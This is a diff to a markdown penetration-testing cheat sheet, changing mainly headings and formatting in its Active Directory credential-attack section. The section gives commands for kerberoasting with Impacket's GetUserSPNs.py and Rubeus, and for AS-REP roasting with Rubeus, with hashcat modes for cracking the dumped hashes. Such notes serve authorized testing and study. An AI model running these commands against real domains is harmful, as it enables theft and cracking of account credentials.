@@ -298,7 +298,7 @@ The safest to pick is **services.exe**.
 
 ### Find AS-Kerbroastable Hash
 
-### With SPN - GetUserSPNs
+#### With GetUserSPNs
 
 SPN (Service Principal Name) is the mapping between service and account.
 
@@ -307,24 +307,25 @@ SPN (Service Principal Name) is the mapping between service and account.
  > Enumerate SPN.
 
  > 
- > **<font color=red>python3 /opt/impacket/examples/GetUserSPNs.py</font> mydomain.local<font color=red>/</font>myUser<font color=red>:</font>myPassword <font color=red>-dc-ip</font> \[TARGET_DC_IP\] <font color=red>-request</font>**
- > Dump Kerberos hash of kerberoastable users. (Then hashcat -m 13100).
+ > **<font color=red>python3 /opt/impacket/examples/GetUserSPNs.py</font> mydomain.local<font color=red>/</font>myUser<font color=red>:</font>myPassword <font color=red>-dc-ip</font> \[TARGET_DC_IP\] <font color=red>-request</font>**</br>
+ > Dump Kerberos hash of kerberoastable users. (Then `hashcat -m 13100`).
 
-### With Rubeus
+#### With Rubeus
 
  > 
  > **<font color=red>Rubeus.exe kerberoast</font>**</br>
- > Dump Kerberos hashes of kerberoastable users (like GetUserSPNs.py but locally). (Then hashcat -m 13100).
+ > Dump Kerberos hashes of kerberoastable users (like GetUserSPNs.py but on the target machine). Then use `hashcat -m 13100`.
 
 ---
 
 ### Find AS-REProastable Hash
 
-### With Rubeus
+#### With Rubeus
 
  > 
- > **<font color=red>Rubeus.exe asreproast</font>**  
- > Run AS-REP roast command looking for vulnerable users.  (Then Insert `23$` after `$krb5asrep$` and hashcat -m 18200)
+ > **<font color=red>Rubeus.exe asreproast</font>**</br>
+  
+ > Run AS-REP roast command looking for vulnerable users.  (Then Insert `23$` after `$krb5asrep$` and use `hashcat -m 18200`).
 
 ---
 
